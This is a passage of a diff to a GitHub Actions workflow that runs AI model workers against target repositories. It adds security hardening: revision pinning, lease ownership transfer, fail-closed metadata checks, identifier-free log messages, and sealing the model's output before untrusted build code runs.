@@ -4,7 +4,11 @@
 # identity in the registry (orchestration/provenance/) and stops; its lease releases immediately,
 # and the dispatch sweep drives the review-fix loop that alone may arm the PR.
 name: worker
-run-name: worker claim=${{ inputs.claim_id || 'self' }}
+# The target_repo is embedded in the run-name so the throughput-metrics collector (scripts/
+# metrics.py) can attribute a registry-hosted worker run to its TARGET — sparq's worker/review
+# orchestration runs here in the registry, not in a sparq-hosted workflow, so per-target health
+# must be filtered off these run names. Mirrors review-fix.yml's run-name convention.
+run-name: worker ${{ inputs.target_repo }} claim=${{ inputs.claim_id || 'self' }}
 
 on:
   workflow_dispatch:
@@ -45,6 +49,7 @@ jobs:
     outputs:
       target_owner: ${{ steps.inputs.outputs.target_owner }}
       target_name: ${{ steps.inputs.outputs.target_name }}
+      target_sha: ${{ steps.target_rev.outputs.target_sha }}
       issue_author: ${{ steps.issue.outputs.issue_author }}
       issue_body_sha: ${{ steps.issue.outputs.issue_body_sha }}
       packages: ${{ steps.issue.outputs.packages }}
@@ -111,6 +116,21 @@ jobs:
           repository: ${{ inputs.target_repo }}
           path: target-routing
           persist-credentials: false
+
+      # Bind the whole decision to ONE target revision (issue #143): routing/model_chain/agent are
+      # resolved from THIS checkout's HEAD, but the worker job later checks out the moving default
+      # branch and only re-checks that the claimed model still exists — so a routing update landing
+      # between the two jobs could run a stale/out-of-policy model+prompt. Export the exact commit
+      # SHA the route was resolved against and pin the worker's target checkout to it, so the model
+      # runs on, and re-reads its routing metadata from, the identical revision policy saw here.
+      - name: Pin the resolved target routing revision
+        id: target_rev
+        run: |
+          set -euo pipefail
+          sha="$(git -C target-routing rev-parse HEAD)"
+          [[ "$sha" =~ ^[0-9a-f]{40}$ ]] || { echo '::error::resolved target revision is not a 40-hex commit sha'; exit 1; }
+          printf 'target_sha=%s\n' "$sha" >> "$GITHUB_OUTPUT"
+          printf 'worker: routing resolved against target revision %s\n' "$sha"
 
       - name: Snapshot issue labels and revision
         id: issue
@@ -256,15 +276,21 @@ jobs:
           allocator = importlib.util.module_from_spec(spec)
           spec.loader.exec_module(allocator)
           account_name = os.environ["ACCOUNT"]
-          matches = [item for item in catalog if item.get("title", "").strip() == account_name]
+          # Use the allocator's ONE structural selector here as well. Live self-claim and
+          # dispatcher-claim adoption already enter through read_accounts(); keeping dry-run on
+          # this exact function prevents a broad issue listing from becoming a divergent pool.
+          matches = [item for item in allocator.select_account_issues(catalog)
+                     if item.get("title", "").strip() == account_name]
+          # Privacy (issue #135): these run in PUBLIC logs, so every failure message stays
+          # identifier-free — the raw account handle is never interpolated into the diagnostic.
           if len(matches) != 1:
-              raise SystemExit(f"selected account {account_name} is missing or ambiguous")
+              raise SystemExit("selected account is missing or ambiguous in the catalog")
           item = matches[0]
           labels = {label.get("name") for label in item.get("labels", []) if isinstance(label, dict)}
           if "status:available" not in labels:
-              raise SystemExit(f"selected account {account_name} is not available")
+              raise SystemExit("selected account is not marked status:available")
           if account_name not in policy["account_pool"]:
-              raise SystemExit(f"selected account {account_name} is outside the resolved account pool")
+              raise SystemExit("selected account is outside the resolved account pool")
 
           # Round 5: route the parsed record through the SAME read-time legacy-shape
           # normalization read_accounts applies (sol r3 f1). A raw _parse_account() here gates
@@ -272,11 +298,15 @@ jobs:
           # sol-led dry-run even though the live claim path normalizes it. (Privacy: the parsed
           # record carries no handle and this step exports no PROVENANCE_SALT, so the shared
           # diagnostic stays handle-free in these public logs.)
-          account = allocator.normalize_legacy_models(allocator._parse_account(item.get("body")))
+          try:
+              account = allocator.validate_account_record(account_name, item.get("body"))
+          except allocator.LeaseIOError as exc:
+              raise SystemExit("selected account record is malformed") from exc
+          account = allocator.normalize_legacy_models(account)
           model = next((candidate for candidate in policy["model_chain"]
                         if candidate in account.get("models", [])), None)
           if model is None:
-              raise SystemExit(f"selected account {account_name} cannot serve the resolved model chain")
+              raise SystemExit("selected account cannot serve the resolved model chain")
           model_meta = routing.get("models", {}).get(model)
           if not isinstance(model_meta, dict):
               raise SystemExit(f"selected model {model} has no routing metadata")
@@ -335,6 +365,7 @@ jobs:
     needs: resolve
     runs-on: ubuntu-latest
     timeout-minutes: 10
+    environment: dispatch-secrets
     permissions:
       contents: write
       issues: read
@@ -363,15 +394,29 @@ jobs:
           ISSUE_NUMBER: ${{ inputs.issue_number }}
           MODELS: ${{ needs.resolve.outputs.model_chain }}
           ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
-          PACKAGE: ${{ needs.resolve.outputs.packages }}
+          PACKAGES: ${{ needs.resolve.outputs.packages }}
           ROLE: ${{ needs.resolve.outputs.role }}
           TIMEOUT_MINUTES: ${{ needs.resolve.outputs.worker_timeout_minutes }}
+          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
         run: |
           set -euo pipefail
           [[ "$TIMEOUT_MINUTES" =~ ^[1-9][0-9]*$ ]]
           ttl=$((TIMEOUT_MINUTES * 60 + 900))
           holder="$TARGET_REPO#$ISSUE_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
-          lease_package=${PACKAGE:-__global__}
+          # Canonical lease partition (issue #133; mirrors dispatch-plan._plan_package /
+          # dispatch-claim.plan_package): EXACTLY one area reserves that area; ZERO OR MULTIPLE
+          # areas reserve the serializing __global__ partition, which the ledger excludes against
+          # every sibling. This self-claim MUST reduce identically to the dispatcher-claim adoption
+          # path below (and to the dispatcher that mints an adoptable claim), or the SAME issue
+          # reserves a different partition by entry path and a multi-area lease (e.g. "foo,bar")
+          # fails to conflict with a concurrent single-area sibling ("foo"). PACKAGES is the resolve
+          # job's sorted, de-duplicated area CSV whose values are comma-free, so a comma marks
+          # two-or-more areas. Fail-closed: over-serialize a multi-area issue, never free a busy crate.
+          if [[ -n "$PACKAGES" && "$PACKAGES" != *,* ]]; then
+            lease_package="$PACKAGES"
+          else
+            lease_package=__global__
+          fi
           set +e
           python3 registry/scripts/select-and-claim.py \
             --claim \
@@ -415,14 +460,28 @@ jobs:
               raise SystemExit("allocator returned an unsafe or mismatched secret_ref")
           if not re.fullmatch(r"[0-9a-f]{32}", str(claim_id)):
               raise SystemExit("allocator returned an unsafe claim_id")
+          # Fail-closed on a malformed catalog entry (issue #142): a claimed account MUST declare
+          # every routing-relevant metadata field. An empty/missing provider, harness, or credential
+          # format never rides through as "" — the strict routing equality below only fires on
+          # NON-empty claimed values, so a blank field would let an account be routed on metadata it
+          # never declared. Reject here so it never reaches the outputs or the secret.
+          provider = claim.get("provider")
+          harness = claim.get("harness")
+          credential_format = claim.get("credential_format")
+          for field_name, field_value in (
+                  ("provider", provider),
+                  ("harness", harness),
+                  ("credential_format", credential_format)):
+              if not isinstance(field_value, str) or not field_value:
+                  raise SystemExit(f"allocator returned an empty or missing {field_name}")
           values = {
               "acquired": "true",
               "account": account,
               "claim_id": claim_id,
               "model": model,
-              "provider": claim.get("provider") or "",
-              "harness": claim.get("harness") or "",
-              "credential_format": claim.get("credential_format") or "",
+              "provider": provider,
+              "harness": harness,
+              "credential_format": credential_format,
               "secret_ref": secret_ref,
           }
           with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
@@ -436,7 +495,7 @@ jobs:
           print(f"lease claimed: model={model}, claim={claim_id[:8]}")
           PY
 
-      - name: Adopt dispatcher-owned CAS claim
+      - name: Adopt dispatcher-owned CAS claim (ownership transfer)
         id: adopt
         if: ${{ inputs.claim_id != '' }}
         env:
@@ -449,12 +508,25 @@ jobs:
           ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
           PACKAGES: ${{ needs.resolve.outputs.packages }}
           ROLE: ${{ needs.resolve.outputs.role }}
+          TIMEOUT_MINUTES: ${{ needs.resolve.outputs.worker_timeout_minutes }}
+          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
         run: |
           set -euo pipefail
+          # Adoption is a CAS OWNERSHIP TRANSFER, not a read-only look (issue #132): --adopt swaps
+          # the lease holder from the dispatcher to THIS worker run and re-bases its expiry to
+          # now + the worker's full run budget, so (a) two runs can never both own one claim, (b) a
+          # queued worker whose dispatcher lease already expired is refused (exit 3) instead of
+          # resurrecting a reallocated slot, and (c) the lease cannot expire mid-run. The refreshed
+          # ttl matches the claim job's self-claim ttl (worker_timeout + 15m slack).
+          [[ "$TIMEOUT_MINUTES" =~ ^[1-9][0-9]*$ ]]
+          ttl=$((TIMEOUT_MINUTES * 60 + 900))
+          holder="$TARGET_REPO#$ISSUE_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
           python3 registry/scripts/select-and-claim.py \
-            --inspect "$CLAIM_ID" \
+            --adopt "$CLAIM_ID" \
             --repo "$GITHUB_REPOSITORY" \
-            --expected-holder-prefix "$TARGET_REPO#$ISSUE_NUMBER@" > "$RUNNER_TEMP/adopt.json"
+            --expected-holder-prefix "$TARGET_REPO#$ISSUE_NUMBER@" \
+            --holder "$holder" \
+            --ttl "$ttl" > "$RUNNER_TEMP/adopt.json"
           if ! python3 - "$RUNNER_TEMP/adopt.json" <<'PY'
           import json
           import os
@@ -469,8 +541,14 @@ jobs:
           secret_ref = claim.get("secret_ref")
           pool = os.environ["ACCOUNT_POOL"].split(",")
           models = os.environ["MODELS"].split(",")
-          packages = os.environ["PACKAGES"].split(",") if os.environ["PACKAGES"] else []
-          expected_package = packages[0] if packages else "__global__"
+          # Canonical lease partition (issue #133; mirrors dispatch-plan._plan_package /
+          # dispatch-claim.plan_package): EXACTLY one area -> that area; ZERO OR MULTIPLE areas ->
+          # the serializing __global__ partition. This MUST match the self-claim reduction above AND
+          # the dispatcher that minted this claim (dispatch-claim.plan_package), or a legitimate
+          # multi-area dispatcher claim (package="__global__") is rejected here while a "foo,bar"
+          # issue reserves a partition that never conflicts with a concurrent "foo" sibling.
+          areas = [area for area in os.environ["PACKAGES"].split(",") if area]
+          expected_package = areas[0] if len(areas) == 1 else "__global__"
           if account != os.environ["EXPECTED_ACCOUNT"] or account not in pool:
               raise SystemExit("dispatcher claim account is outside resolved policy")
           if model not in models:
@@ -482,14 +560,27 @@ jobs:
           if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(
                   r"[A-Z][A-Z0-9_]*", str(secret_ref)):
               raise SystemExit("dispatcher claim secret_ref is unsafe")
+          # Fail-closed on a malformed catalog entry (issue #142): mirror the self-claim path — a
+          # dispatcher-minted claim MUST declare every routing-relevant metadata field. An empty
+          # provider/harness/credential format would be skipped by the routing equality check below
+          # and route the account on undeclared metadata; reject before it reaches outputs/secret.
+          provider = claim.get("provider")
+          harness = claim.get("harness")
+          credential_format = claim.get("credential_format")
+          for field_name, field_value in (
+                  ("provider", provider),
+                  ("harness", harness),
+                  ("credential_format", credential_format)):
+              if not isinstance(field_value, str) or not field_value:
+                  raise SystemExit(f"dispatcher claim returned an empty or missing {field_name}")
           values = {
               "acquired": "true",
               "account": account,
               "claim_id": claim_id,
               "model": model,
-              "provider": claim.get("provider") or "",
-              "harness": claim.get("harness") or "",
-              "credential_format": claim.get("credential_format") or "",
+              "provider": provider,
+              "harness": harness,
+              "credential_format": credential_format,
               "secret_ref": secret_ref,
           }
           with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
@@ -501,6 +592,10 @@ jobs:
           print(f"dispatcher lease adopted: model={model}, claim={claim_id[:8]}")
           PY
           then
+            # Safe to release now: --adopt already CAS-transferred this lease to OUR run holder, so
+            # this release deletes only our own lease — never a concurrent run's (issue #132: the
+            # old --inspect path released a claim it did not own). A not-adoptable/already-adopted
+            # claim never reaches here — --adopt exits 3 and `set -e` fails the step first.
             python3 registry/scripts/select-and-claim.py \
               --release "$CLAIM_ID" \
               --repo "$GITHUB_REPOSITORY" || true
@@ -525,8 +620,27 @@ jobs:
       # `provenance` job below, which executes no target code.
       contents: read
     outputs:
-      pr_number: ${{ steps.pr.outputs.pr_number }}
+      # Target App identity + default branch, resolved by the `target` step at the TOP of this job
+      # — before the checkout, before the model, and long before the gate. Like the bundle record
+      # below, these are step outputs the runner captured while the runner was still clean, so the
+      # isolated `publish` job can consume them without re-deriving; an empty value fails the
+      # publisher's regex validation closed rather than defaulting to anything.
       bot_login: ${{ steps.target.outputs.bot_login }}
+      bot_id: ${{ steps.target.outputs.bot_id }}
+      default_branch: ${{ steps.target.outputs.default_branch }}
+      # PRE-GATE publish record (issue #575). These three are step outputs of the `bundle` step,
+      # which runs BEFORE the target's own gate: the runner captures them while the runner is still
+      # clean, and nothing a later step does — including the hostile gate — can alter a step output
+      # that has already been captured. The isolated `publish` job re-derives the digest from the
+      # downloaded artifact and compares it against THESE values before it mints any token, so a
+      # gate that rewrites the bundle, the registry checkout, or $GITHUB_ENV cannot get content
+      # published. An empty bundle_digest (bundle step failed/skipped) means no publish at all.
+      bundle_digest: ${{ steps.bundle.outputs.bundle_digest }}
+      bundle_base_sha: ${{ steps.bundle.outputs.bundle_base_sha }}
+      # The gate verdict crosses as a value, not as a token-bearing step: the publisher opens the
+      # DRAFT PR only on `success`, and still creates follow-up issues on any other outcome (the
+      # behaviour the old in-job `always()` followups step had).
+      gate_outcome: ${{ steps.gate.outcome }}
       # Model-access health (registry #32): the sanitized exit CLASS of the model launch, surfaced
       # so the separate no-target-code `model_health` job records it (success or failure). The
       # provider/account/model come from the pre-hostile `claim` job outputs (not this job, which
@@ -535,15 +649,25 @@ jobs:
       # The sanitized session-limit reset time worker-live.sh extracts (review defect #9); empty
       # for every other class. Feeds the provider-capped alert's "earliest known reset".
       reset_hint: ${{ steps.exit-class.outputs.reset_hint }}
+      # THIS job's run attempt, stamped beside the class (review round 1 of #425): the recorder's
+      # idempotency key must track the attempt that PRODUCED the outcome, not the recorder's own.
+      # A recorder-only retry replays this preserved output (same attempt -> dedup no-op); a full
+      # re-run re-executes this job and stamps a fresh attempt, so its genuinely new outcome
+      # still counts toward backoff/outage thresholds.
+      outcome_attempt: ${{ steps.exit-class.outputs.outcome_attempt }}
       # Final-state inputs (issue #127): surfaced so the SEPARATE always() `final_state` job can
       # converge the issue status even when THIS job is killed by its `worker_timeout_minutes`
       # timeout or a cancellation (which stops even an in-job always() step from running). On a
       # timeout/cancel the incomplete steps leave these empty, and the downstream job fails closed
       # to `deferred` — taking the issue OUT of status:in-progress and back into the redispatch pool.
-      pr_url: ${{ steps.pr.outputs.pr_url }}
+      # (pr_url now comes from the isolated `publish` job — see issue #575.)
       exhausted: ${{ steps.budget.outputs.exhausted }}
       trust_outcome: ${{ steps.trust.outcome }}
       attempt_number: ${{ steps.attempt.outputs.number }}
+      # [registry #596] 'true' when THIS run's attempt receipt was voided as a credential outage.
+      # final_state must not park the issue on the "final allowed attempt produced no PR" arm when
+      # the attempt was never spent — that arm reads attempt_number, which the void cannot lower.
+      attempt_voided: ${{ steps.attempt-void.outputs.voided }}
     concurrency:
       group: worker-${{ inputs.target_repo }}-${{ inputs.issue_number }}
       cancel-in-progress: false
@@ -622,11 +746,17 @@ jobs:
           print(f"target token verified for {repo['full_name']} at {default_branch}")
           PY
 
-      - name: Checkout target default branch with scoped App token (pinned, no persisted token)
+      # Pin to the SHA the resolve job resolved the route against (issue #143), NOT the moving
+      # default-branch tip: the `selected` step below re-reads routing metadata from this checkout,
+      # and the model runs on it, so both must be the exact revision policy + the account claim were
+      # bound to. A routing change that lands after resolve is picked up by the next dispatch cycle,
+      # never mid-run on an already-claimed lease. fetch-depth: 0 makes the SHA fetchable; the PR is
+      # still opened against the branch NAME (steps.target.outputs.default_branch) at publish time.
+      - name: Checkout target at the resolved routing revision (pinned, no persisted token)
         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         with:
           repository: ${{ inputs.target_repo }}
-          ref: ${{ steps.target.outputs.default_branch }}
+          ref: ${{ needs.resolve.outputs.target_sha }}
           path: target
           token: ${{ steps.app-token-dry.outputs.token || steps.app-token-live.outputs.token }}
           fetch-depth: 0
@@ -711,14 +841,19 @@ jobs:
           }:
               raise SystemExit("claimed model has an unsupported credential format")
           if not dry:
+              # Strict routing equality (issue #142): require EXACT equality, not the old
+              # "compare only when the claimed value is non-empty" guard. The claim/adopt jobs now
+              # reject empty metadata, but the selected-model step is the last gate before a secret
+              # is exposed, so it enforces the same non-empty exact-match contract the dry-run branch
+              # applies below — an empty or drifted provider/harness/format fails closed here too.
               claimed_provider = os.environ["LIVE_PROVIDER"]
               claimed_harness = os.environ["LIVE_HARNESS"]
               claimed_format = os.environ["LIVE_CREDENTIAL_FORMAT"]
-              if claimed_provider and claimed_provider != values["provider"]:
+              if claimed_provider != values["provider"]:
                   raise SystemExit("claimed account provider conflicts with protected routing")
-              if claimed_harness and claimed_harness != values["harness"]:
+              if claimed_harness != values["harness"]:
                   raise SystemExit("claimed account harness conflicts with protected routing")
-              if claimed_format and claimed_format != values["credential_format"]:
+              if claimed_format != values["credential_format"]:
                   raise SystemExit("claimed account credential format conflicts with protected routing")
           elif any(values[key] != value for key, value in expected.items()):
               raise SystemExit("dry-run account metadata drifted from protected routing")
@@ -736,6 +871,13 @@ jobs:
           print(f"selected account resolved: model={model}, harness={values['harness']}")
           PY
 
+      # Round-4 finding 1 (windowed-vs-lifetime split brain): attempt-check re-derives the SAME
+      # human-readmission cutoff CLAIM granted the retry on (park_policy.readmission_cutoff over
+      # the live label timeline, strict maintainer probe) and charges the WINDOWED attempt
+      # count. The cutoff is deliberately derived WORKER-SIDE, never taken from the dispatch
+      # payload: like every other last-step guard here (trust reverify, strict routing
+      # equality), the budget evidence is re-proved live so a workflow_dispatch caller can
+      # never mint budget. A genuinely exhausted windowed budget still fails closed below.
       - name: Check durable per-issue attempt budget
         id: budget
         if: ${{ !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
@@ -792,6 +934,9 @@ jobs:
           WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
           WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
           WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
+          # Provider refresh tokens are ONE-TIME-USE (issue #596): a dry run must not consume the
+          # account's stored grant, so it materializes the mount without exchanging anything.
+          WORKER_PREFLIGHT_REFRESH: ${{ inputs.dry_run && 'skip' || 'refresh' }}
         run: bash registry/scripts/worker-prep.sh
 
       - name: Confirm dry-run boundary
@@ -855,43 +1000,121 @@ jobs:
           if [[ "$MODEL_OUTCOME" == "success" ]]; then
             cls=success
           elif [[ "$MODEL_OUTCOME" == "skipped" ]]; then
-            cls=unknown   # pre-launch abort: no CLI ever ran
+            # Pre-launch abort: no CLI ever ran. worker-prep's host-side credential pre-flight
+            # (issue #596) nonetheless classifies its own failures into WORKER_EXIT_CLASS before the
+            # model step can run, so prefer that over a blanket `unknown`.
+            cls="${WORKER_EXIT_CLASS:-unknown}"
           else
             # failure OR cancellation/timeout: use the host-observed class when worker-live.sh
             # got far enough to write one; otherwise unknown.
             cls="${WORKER_EXIT_CLASS:-unknown}"
           fi
-          echo "class=$cls" >> "$GITHUB_OUTPUT"
-          echo "reset_hint=${WORKER_RESET_HINT:-}" >> "$GITHUB_OUTPUT"
+          # outcome_attempt: the attempt that produced this outcome — the recorder's dedup key
+          # (review r1 of #425). Grouped redirect (SC2129): one append, three keys.
+          {
+            echo "class=$cls"
+            echo "reset_hint=${WORKER_RESET_HINT:-}"
+            echo "outcome_attempt=${GITHUB_RUN_ATTEMPT:-}"
+          } >> "$GITHUB_OUTPUT"
 
-      # TTL guard (audit-2026-07-17): App installation tokens live 60 minutes and app-token-live is
-      # minted BEFORE the heavy checkout + toolchain + model run, so with worker_timeout_minutes=90
-      # every long run used to reach publish/followups/final-state with an EXPIRED token — the
-      # model's completed work was discarded AND the deferral write failed, stranding the issue
-      # status:in-progress. This fresh mint immediately after the model step keeps all post-model
-      # writes inside a new 60-minute window. `always()` is load-bearing: final-state also runs on
-      # the failure path. continue-on-error + the `|| app-token-live` fallbacks below keep a mint
-      # hiccup from being worse than the old single-mint behavior.
-      - name: Mint post-model target-scoped App token (publish/final-state TTL guard)
-        id: app-token-post
-        if: ${{ always() && !inputs.dry_run }}
-        continue-on-error: true
-        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
+      # [registry #596] A CREDENTIAL-OUTAGE launch failure must NOT consume an attempt from the
+      # bounded deferred-retry budget. The attempt receipt above is the LAST gate before the model
+      # launches, so a launch that died on the worker account's credential (acct01's codex OAuth
+      # access token expires hourly while the fleet stores a static snapshot of it) burned a full
+      # attempt without the model ever running — and enough of those parked the issue
+      # (status:parked) exactly as if the model had declined the task, which inverts the park policy.
+      #
+      # It runs HERE rather than in `final_state` because the next dispatch tick re-reads the attempt
+      # budget from these durable receipts. The class gate lives in worker-pr.is_credential_outage
+      # (pure + self-tested), NOT in this `if:` — `setup`/`unknown`/timeouts stay CHARGED, keeping the
+      # bounded-crash accounting intact. The app-token-live token is the one record-attempt already
+      # used; no new capability, and this step precedes the target-code cargo gate below.
+      - name: Void the worker attempt on a credential-outage exit (never a decline)
+        id: attempt-void
+        if: ${{ always() && !inputs.dry_run && steps.attempt.outcome == 'success' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
+          EXIT_CLASS: ${{ steps.exit-class.outputs.class }}
+        run: |
+          python3 registry/scripts/worker-issue.py void-attempt \
+            --repo "${{ inputs.target_repo }}" \
+            --issue "${{ inputs.issue_number }}" \
+            --bot-login "${{ steps.target.outputs.bot_login }}" \
+            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
+            --exit-class "$EXIT_CLASS"
+
+      # ---- ISSUE #575: the hostile/token boundary ---------------------------------------------
+      # Everything below this point on THIS runner is reachable by target-controlled code (the
+      # cargo gate a few steps down runs the target's own build scripts and tests as the runner
+      # user). So the model's work is SEALED HERE, while the runner is still clean, as a directory
+      # of inert data — a unified patch plus the host-built PR title/body/meta and the model's
+      # declared follow-ups. worker-live.sh `bundle` refuses to run at all if a GitHub token is in
+      # scope, and it restores the index it staged so the gate below still sees exactly the
+      # worktree the model left (a committed or staged tree would empty the gate's changed-path
+      # classifiers and make the gate VACUOUS — which is why the commit is reconstructed on the
+      # publisher instead of being made here).
+      #
+      # The digest lands in $GITHUB_OUTPUT of THIS step, which the runner captures before the gate
+      # step starts; no later step can rewrite an already-captured step output. That captured
+      # digest is the root of trust the isolated `publish` job verifies against.
+      - name: Seal the model's work as a digest-bound bundle (PRE-GATE, no token)
+        id: bundle
+        if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}
+        working-directory: target
+        env:
+          # Deliberately NO GH_TOKEN: this phase must be token-free, and worker-live.sh asserts it.
+          TARGET_DIR: ${{ github.workspace }}/target
+          TARGET_REPO: ${{ inputs.target_repo }}
+          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          WORKER_ROOT: ${{ runner.temp }}/registry-worker
+          WORKER_ISSUE_FILE: ${{ runner.temp }}/verified-issue.json
+          # WORKER_BRANCH is inherited from $GITHUB_ENV (the model step's host-side branch
+          # creation); the publisher does NOT trust it — it re-derives the same deterministic name
+          # from run identity and defers on any drift.
+          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
+          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
+          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
+          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
+          GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
+          ARM_AUTO_MERGE_REQUESTED: ${{ needs.resolve.outputs.arm_auto_merge }}
+        run: bash ../registry/scripts/worker-live.sh bundle
+
+      # Uploaded PRE-GATE as well: the artifact service takes its copy while the runner is clean,
+      # so a gate that later rewrites the on-disk bundle changes nothing the publisher downloads —
+      # and if it managed to replace the artifact anyway, the digest comparison refuses it.
+      # if-no-files-found: error keeps a silently empty upload from becoming a silent no-publish.
+      - name: Upload the pre-gate publish bundle (inert data only)
+        if: ${{ !inputs.dry_run && steps.bundle.outcome == 'success' }}
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
-          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
-          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
-          owner: ${{ needs.resolve.outputs.target_owner }}
-          repositories: ${{ needs.resolve.outputs.target_name }}
-          permission-contents: write
-          permission-issues: write
-          permission-pull-requests: write
-          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
-          # branches touching .github/workflows/* (role:ci issues were structurally blocked).
-          permission-workflows: write
+          name: publish-bundle-${{ github.run_id }}-${{ github.run_attempt }}
+          path: ${{ runner.temp }}/registry-worker/publish-bundle
+          if-no-files-found: error
+          retention-days: 1
 
       - name: Write back a rotated full account credential
         id: writeback
-        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.prepare.outcome == 'success' && steps.model.outcome != 'skipped' }}
+        # NO model-step guard (issue #596): rotation now happens in worker-prep's HOST-SIDE
+        # pre-flight, before the model step exists. Provider refresh tokens are one-time-use, so
+        # dropping this step because the model never launched would strand a consumed grant in the
+        # secret and kill the NEXT run on this account.
+        #
+        # NO PREPARE-STEP GUARD EITHER (retro-review of #614). `steps.prepare.outcome == 'success'`
+        # made this compensating action reachable ONLY from the success path — the same class as
+        # #604's root cause, where the round-void job was gated on the very verdict a credential
+        # outage prevents. The pre-flight consumes the ONE-TIME-USE refresh token EARLY inside
+        # prepare, and prepare then keeps going: materialize the minimal mount, assert no refresh
+        # material leaked, copy the tamper baseline, npm-install the pinned CLI, export $GITHUB_ENV.
+        # ANY failure in that window skipped this step, so the OLD grant was spent, the NEW grant
+        # died with the runner, and the account was PERMANENTLY dead until an interactive re-mint.
+        # The condition is now keyed to `always()` plus the ACCOUNT SELECTION (which identifies the
+        # secret to write and precedes the pre-flight), and worker-live.sh's rotation MARKER — the
+        # host-side "a rotation was obtained" receipt — decides whether there is anything to
+        # persist. With no marker this step is a no-op: it reports rotated=false and exits 0.
+        # Asserted by dispatch-secrets-guard.rotation_writeback_reachable_verdict, so restoring a
+        # success-only guard is a red tick rather than a silent regression.
+        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.selected.outcome == 'success' }}
         env:
           WORKER_ROOT: ${{ runner.temp }}/registry-worker
           WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
@@ -932,47 +1155,14 @@ jobs:
           # crash signal. The failure-class annotation below reads only host-derived step outcomes.
         run: bash ../registry/scripts/worker-live.sh gate
 
-      - name: Commit, push, and open DRAFT target pull request (review pending)
-        id: pr
-        if: ${{ !inputs.dry_run && steps.gate.outcome == 'success' }}
-        working-directory: target
-        env:
-          GH_TOKEN: ${{ steps.app-token-post.outputs.token || steps.app-token-live.outputs.token }}
-          TARGET_DIR: ${{ github.workspace }}/target
-          TARGET_REPO: ${{ inputs.target_repo }}
-          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
-          TARGET_BOT_LOGIN: ${{ steps.target.outputs.bot_login }}
-          TARGET_BOT_ID: ${{ steps.target.outputs.bot_id }}
-          ISSUE_NUMBER: ${{ inputs.issue_number }}
-          WORKER_ROOT: ${{ runner.temp }}/registry-worker
-          WORKER_ISSUE_FILE: ${{ runner.temp }}/verified-issue.json
-          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
-          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
-          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
-          GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
-          ARM_AUTO_MERGE_REQUESTED: ${{ needs.resolve.outputs.arm_auto_merge }}
-        run: bash ../registry/scripts/worker-live.sh publish
-
-      - name: Create declared follow-up issues (discovered out-of-scope work)
-        # The procedure for the orchestrator to capture work it discovers but must NOT do in this PR:
-        # the model appends {title, body, labels} lines to WORKER_ROOT/followups.jsonl (worker-live.sh
-        # moves them out of the target tree BEFORE the commit so they are never committed), and this
-        # step creates de-duplicated, labelled, back-linked issues. Best-effort; never fails the worker.
-        if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}
-        continue-on-error: true
-        env:
-          GH_TOKEN: ${{ steps.app-token-post.outputs.token || steps.app-token-live.outputs.token }}
-          WORKER_ROOT: ${{ runner.temp }}/registry-worker
-        run: |
-          set -uo pipefail
-          for l in from:agent self-improvement; do
-            gh label create "$l" -R "${{ inputs.target_repo }}" --color ededed \
-              --description "worker-discovered follow-up" 2>/dev/null || true
-          done
-          python3 registry/scripts/worker-issue.py followup \
-            --repo "${{ inputs.target_repo }}" \
-            --issue "${{ inputs.issue_number }}" \
-            --spec-file "$WORKER_ROOT/followups.jsonl" || true
+      # NOTHING TOKEN-BEARING FOLLOWS THE GATE (issue #575). Commit/push/DRAFT-PR and the follow-up
+      # issues used to live right here, on this runner, with a contents/workflows/issues/PR-capable
+      # App token — after the gate had already executed target-controlled build scripts and tests.
+      # They now run in the isolated `publish` job below, which executes no target code and no
+      # target-writable script, and which reconstructs the model's work from the digest-bound
+      # bundle sealed BEFORE the gate. The post-gate `app-token-publish` and post-model
+      # `app-token-post` mints are gone with them: there is no longer anything on this runner for a
+      # write-capable token to serve.
 
       # [OPUS-4.8] The diagnostics ARTIFACT was DROPPED for credential-safety (security review,
       # finding #1). Rationale: the `gate` step above runs target-CONTROLLED cargo (build scripts /
@@ -995,25 +1185,199 @@ jobs:
       # annotates; it must NEVER become the terminal failure signal or mask the real cause, so it is
       # `continue-on-error: true` and does NOT `exit 1` (an unconditional nonzero here would re-mask
       # the primary signal — the very masking this diagnostics work set out to remove). The genuine
